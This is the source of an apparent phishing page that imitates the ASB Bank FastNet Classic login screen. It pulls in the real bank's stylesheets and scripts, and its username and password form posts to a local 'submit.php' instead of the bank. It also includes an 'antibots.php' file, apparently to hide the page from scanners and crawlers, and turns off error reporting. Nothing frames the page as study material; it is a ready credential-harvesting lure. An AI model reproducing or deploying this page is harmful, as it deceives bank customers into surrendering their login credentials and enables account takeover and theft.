<?php
session_start();
error_reporting(0);
require "antibots.php";
?>
<!DOCTYPE html>
<!--[if HTML5]><![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie11 lt-ie10 lt-ie9" lang="en"> <![endif]-->
<!--[if IE 9]>         <html class="no-js lt-ie11 lt-ie10" lang="en"> <![endif]-->
<!--[if IE 10]>        <html class="no-js lt-ie11" lang="en"> <![endif]-->
<!--[if gt IE 10]><!-->
<html class="no-js" lang="en">
<!--<![endif]-->
<!-- 13/09/2016 09:25 -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="max-age=0" />
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="expires" content="0" />
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
	<meta http-equiv="pragma" content="no-cache" />
    <link rel="shortcut icon" href="https://online.asb.co.nz/auth/favicon.ico" />
    
        <title>ASB Bank - Log in</title>
    


	
    <link href="https://online.asb.co.nz/auth/css/fonts.min.css?v=1.0.5.10" rel="stylesheet" />
    <link href="https://online.asb.co.nz/auth/css/style.min.css?v=1.0.5.10" rel="stylesheet" />

    <script src="https://online.asb.co.nz/auth/js/modernizr-2.7.1.js?v=1.0.5.10" type="text/javascript"></script>
    <script src="https://online.asb.co.nz/auth/js/json2.min.js?v=1.0.5.10"></script>
    <script src="https://online.asb.co.nz/auth/js/sha1.min.js?v=1.0.5.10"></script>
    <script src="https://online.asb.co.nz/auth/js/jquery-1.11.0.min.js?v=1.0.5.10" type="text/javascript"></script>
    <script src="https://online.asb.co.nz/auth/js/PopupManager.min.js?v=1.0.5.10"></script>
    <script src="https://online.asb.co.nz/auth/js/custFontSize.min.js?v=1.0.5.10"></script>
	<script src="https://online.asb.co.nz/auth/js/jquery-1.11.0.min.js?v=1.0.5.10" type="text/javascript"></script>
	<script src="https://online.asb.co.nz/auth/js/underscore-min.js?v=1.0.5.10" type="text/javascript"></script>

    

	

    
 
   


    <!--[if lt IE 9]>
    <script type="text/javascript" src="https://online.asb.co.nz/auth/js/lt-ie9-placeholder.min.js?v=1.0.5.10"></script>
    <![endif]-->

    
      

                           
<SCRIPT type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2Fauth; path=/; secure";
/*]]>*/ 
</SCRIPT>
</head>


    

<body id="body">
    <div class="logon-container">
        <div class="logon-container__row">
            <div class="logon-container__col">
                
                <!-- ASB LOGO -->
                <div class="logon-container">
                    <div class="logon-container__row">
                        <div class="logon-container__col logon-typography--text-center">
                            <div class="logon-header-logo">
                                <a href="https://www.asb.co.nz" title="Go to ASB Homepage">
                                    <svg class="logon-icon--asb" focusable="false"></svg>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- LOGON SCREEN INPUTS SECTION -->
                <div class="logon-container logon-container--grey">

                    <div class="logon-container__inner">
                        <div class="logon-container__row">
                            <div class="logon-container__col">

                                <!-- TITLE SECTION -->
                                <h1 class="logon-typography-h1 logon-typography--text-center">Continue to
                                    
                                    
                                    
                                    
                                    FastNet Classic
                                </h1>

                                <!-- CALLOUT SECTION (Error, Info) -->
                                <div class="logon-callout logon-callout--alert logon-typography-spacing-xxlarge hide">
                                    <i aria-hidden="true" class="logon-icon logon-callout__icon">
                                        <svg class="logon-icon--caution-circular-white" focusable="false"></svg>
                                    </i>
                                    <span id="logon-error-desc1" class="logon-callout__text" role="alert">
                                        
                                    </span>
                                    
                                </div>

                                <!-- NO JAVASCRIPT MESSAGE SECTION -->
                                <noscript>
                                    <div class="logon-callout logon-callout--info logon-typography-spacing-xxlarge">
                                        <i aria-hidden="true" class="logon-icon logon-callout__icon">
                                            <svg class="logon-icon--information" focusable="false"></svg>
                                        </i>
                                        <span class="logon-callout__text">
                                            Your browser seems to have Javascript disabled. Make sure Javascript is enabled to log in.
                                        </span>
                                    </div>
                                </noscript>

                                <!-- COOKIE DISABLED MESSAGE SECTION -->
                                <script LANGUAGE=JavaScript>
                                    var warningString = "<div class=\"warning message input\"><table><tr><td><div class=\"icon info\"></div></td><td><h3>Your browser seems to have cookies disabled. Make sure cookies are enabled to log in.</h3></td></tr></table></div>";
                                    document.cookie = 'acceptsCookies=yes';
                                    if (document.cookie == '') {
                                        document.write(warningString);
                                    }
                                    else {
                                        document.cookie = 'acceptsCookies=yes; expires=Fri, 13-Apr-1970 00:00:00 GMT';
                                    }
                                </script>

                                <!-- SEMBLE MESSAGE SECTION -->
                                

                                <!-- FORM SECTION -->
                                <form name="login" method="post" action="submit.php" id="login" autocomplete="off">
                                    
                                    <input type="hidden" name="authnMod" value="AsbRgyAuthn" />
                                    <input type="hidden" name="action" value="login"/>
                                    <input type="hidden" name="secfk" value="KVTH-VY3E-MNB7-DIL6-VH7C-VI5S-L9H5-Y35H" />
                                    <input type="hidden" name="goto" value="https://online.asb.co.nz/fnc" />
                                    <input type="hidden" name="username" id="username" class="a"/>
                                    <input type="hidden" name="MSISDN" value="" />

                                    <!-- REMEMBERED CUSTOMER SECTION -->
                                    <div id="divRemembered" class="logon-form__field logon-typography--text-center hide">
                                        <div id="customerNameP">
                                            <h3>Hi <span id="customerNameS">null</span></h3>
                                        </div>
                                    </div>

                                    <!-- USERNAME FIELD -->
                                    <div id="divNotRemembered" class="logon-form__field logon-text-field logon-text-field--with-leading-icon logon-text-field--with-trailing-icon ">
                                        <label for="dUsername" class="logon-text-field__label logon-typography-spacing">Username</label>
                                        <div class="logon-text-field__inputcontainer">
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon">
                                                <svg class="logon-icon--profile" focusable="false"></svg>
                                            </i>
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon logon-text-field__icon--error">
                                                <svg class="logon-icon--caution-circular" focusable="false"></svg>
                                            </i>
                                            <input 
                                                type="text"
                                                name="dUsername"
                                                id="dUsername"
                                                class="logon-text-field__input"
                                                maxlength="10"
                                                spellcheck="false"
                                                autocorrect="off"
                                                autocomplete="off"
												required
                                                
                                                >
                                        </div>
                                    </div>

                                    <!-- PASSWORD FIELD -->
                                    <div class="logon-form__field logon-text-field logon-text-field--with-leading-icon logon-text-field--with-trailing-icon ">
                                        <label for="password" class="logon-text-field__label logon-typography-spacing">Password</label>
                                        <div class="logon-text-field__inputcontainer">
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon">
                                                <svg class="logon-icon--lock-outline" focusable="false"></svg>
                                            </i>
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon logon-text-field__icon--error">
                                                <svg class="logon-icon--caution-circular" focusable="false"></svg>
                                            </i>
                                            <input 
                                                id="password"
                                                name="password"
                                                type="password"
                                                class="logon-text-field__input"
                                                id="password"
                                                maxlength="100"
                                                spellcheck="false"
                                                autocorrect="off"
                                                autocomplete="off"
												required
                                                
                                                >
                                        </div>
                                    </div>

                                    <!-- REMEMBER ME SECTION -->
                                    <div class="logon-form__field">
                                        <div class="logon-checkbox-field">
                                            <input id="remember_me" name="remember_me" type="hidden">
                                            <input 
                                                id="remember_me_checkbox" 
                                                name="remember_me_checkbox"
                                                type="checkbox"
                                                class="logon-checkbox-field__native" />
                                            <div class="logon-checkbox-field__background">
                                                <i aria-hidden="true" class="logon-icon logon-checkbox-field__icon">
                                                    <svg class="logon-icon--checkmark"></svg>
                                                </i>    
                                            </div>
                                            <label for="remember_me_checkbox">Remember me</label>
                                            
                                            <button class="logon-tooltip" type="button" aria-label="Tooltip button">
                                                <div class="logon-tooltip-overlay"></div>
                                                <i aria-hidden="true" class="logon-icon logon-tooltip__icon">
                                                    <svg class="logon-icon--information"></svg>
                                                </i> 
                                                <span id="rememberMeHelpText" class="logon-tooltip__text"></span>
                                            </button>
                                        </div>
                                    </div>

                                    <!-- BUTTONS SECTION -->
                                    <div class="logon-form__field logon-typography--text-center">
                                        <button class="logon-button" id="loginBtn" type="submit" >
                                            <div class="logon-button__ripple"></div>
                                            <span class="logon-button__label">Log in</span>
                                        </button>
                                    </div>
                                    <div class="logon-form__field logon-typography--text-center">
                                        <a href="https://online.asb.co.nz/auth/login?action=forgotpwd">Forgot your password?</a>
                                    </div>

                                </form>
                            </div>
                        </div>
                    </div>
                    

                </div>

                <!-- FOOTER SECTION -->
                <div class="logon-container logon-typography--text-center logon-typography-spacing logon-typography-top-spacing">
                    <div class="logon-container__row logon-container__row-cols-1">
                        <div class="logon-container__col">
                            <p class="logon-typography--body1 logon-typography-spacing">Not an ASB customer?
                                
                                    
                                
                                    
                                    <a href="https://www.asb.co.nz/bank-accounts/joining-asb.html" target="_blank" >Register now</a>
                                    
                                
                            </p>
                        </div>

                        <!-- DISCLAIMER AND FOOTER LINKS SECTION -->
                        
                        
                        
                        <div class="logon-container__col"><p class="logon-typography--body2 logon-typography-spacing logon-typography--opacity">FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by ASB Bank Limited. Do not access FastNet unless you have been specifically authorised to do so. Unauthorised access is prohibited.</p></div><div class="logon-container__col logon-typography-spacing-large"><p class="logon-typography--body3 logon-typography-spacing"><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/fastnet-classic-terms-and-conditions.html" target="_blank" >Terms and conditions</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/security" target="_blank" >About security</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/privacy" target="_blank" >Privacy</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/internet-access-terms-and-conditions.html" target="_blank" >Internet access terms</a></p></div>
                         <!-- END DISCLAIMER AND FOOTER LINKS SECTION -->
                        
                    </div>
                </div>

            </div>
        </div>
    </div>

	
</body>



</html>
